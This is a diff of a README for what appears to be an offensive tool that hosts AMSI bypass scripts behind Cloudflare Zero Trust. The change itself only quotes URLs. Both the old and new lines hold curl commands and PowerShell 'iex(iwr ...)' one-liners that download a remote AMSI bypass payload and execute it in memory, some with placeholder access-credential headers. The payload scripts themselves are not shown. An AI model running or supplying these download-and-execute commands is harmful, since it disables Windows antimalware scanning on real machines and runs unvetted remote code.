@@ -46,16 +46,16 @@ git push -u origin main
 
 ```bash
 # ex: random
-curl https://subdomain.yourdomain.com/<folder-name>
+curl "https://subdomain.yourdomain.com/<folder-name>"
 iex(iwr -UseBasicParsing -Uri 'https://subdomain.yourdomain.com/<folder-name>');
 # specific amsi bypass script
-curl https://subdomain.yourdomain.com/<folder-name>?payload=<the-payload-id>
+curl "https://subdomain.yourdomain.com/<folder-name>?payload=<the-payload-id>"
 iex(iwr -UseBasicParsing -Uri 'https://subdomain.yourdomain.com/<folder-name>?payload=<the-payload-id>');
 ###
-curl https://amsi-r2.example.com/amsibypass
+curl "https://amsi-r2.example.com/amsibypass"
 iex(iwr -UseBasicParsing -Uri 'https://amsi-r2.example.com/amsibypass');
 #
-curl https://amsi-r2.example.com/amsibypass?payload=2
+curl "https://amsi-r2.example.com/amsibypass?payload=2"
 iex(iwr -UseBasicParsing -Uri 'https://amsi-r2.example.com/amsibypass?payload=2');
 ```
 
@@ -66,10 +66,10 @@ iex(iwr -UseBasicParsing -Uri 'https://amsi-r2.example.com/amsibypass?payload=2'
 
 ```bash
 # curl command to access behind the zero-trust
-curl https://amsi-r2.example.com/amsibypass -H "CF-Access-Client-Id: <your-CF-Access-Client-Id>" -H "CF-Access-Client-Secret: <your-CF-Access-Client-Secret>"
+curl "https://amsi-r2.example.com/amsibypass" -H "CF-Access-Client-Id: <your-CF-Access-Client-Id>" -H "CF-Access-Client-Secret: <your-CF-Access-Client-Secret>"
 iex(iwr -UseBasicParsing -Uri 'https://amsi-r2.example.com/amsibypass' -Headers @{'CF-Access-Client-Id' = '<your-CF-Access-Client-Id>'; 'CF-Access-Client-Secret' = '<your-CF-Access-Client-Secret>'});
 #
-curl https://amsi-r2.example.com/amsibypass?payload=2 -H "CF-Access-Client-Id: <your-CF-Access-Client-Id>" -H "CF-Access-Client-Secret: <your-CF-Access-Client-Secret>"
+curl "https://amsi-r2.example.com/amsibypass?payload=2" -H "CF-Access-Client-Id: <your-CF-Access-Client-Id>" -H "CF-Access-Client-Secret: <your-CF-Access-Client-Secret>"
 iex(iwr -UseBasicParsing -Uri 'https://amsi-r2.example.com/amsibypass?payload=2' -Headers @{'CF-Access-Client-Id' = '<your-CF-Access-Client-Id>'; 'CF-Access-Client-Secret' = '<your-CF-Access-Client-Secret>'});
 ```
 
